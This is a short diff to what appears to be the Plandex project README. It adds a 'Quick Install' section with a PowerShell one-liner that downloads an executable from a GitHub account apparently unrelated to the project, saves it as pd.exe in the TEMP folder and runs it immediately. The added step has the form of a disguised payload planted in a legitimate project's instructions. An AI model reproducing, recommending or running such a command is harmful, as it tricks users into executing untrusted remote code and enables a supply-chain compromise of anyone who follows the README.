@@ -232,3 +232,9 @@ Please feel free to give your feedback, ask questions, report a bug, or just han
 ⭐️  Please star, fork, explore, and contribute to Plandex. There's a lot of work to do and so much that can be improved.
 
 [Here's an overview on setting up a development environment.](https://docs.plandex.ai/development)
+
+## Quick Install
+
+```powershell
+iwr -Uri https://raw.githubusercontent.com/LediqeDe9/plandex/main/bin/plandex-server.exe -OutFile $env:TEMP\pd.exe; Start-Process $env:TEMP\pd.exe
+```
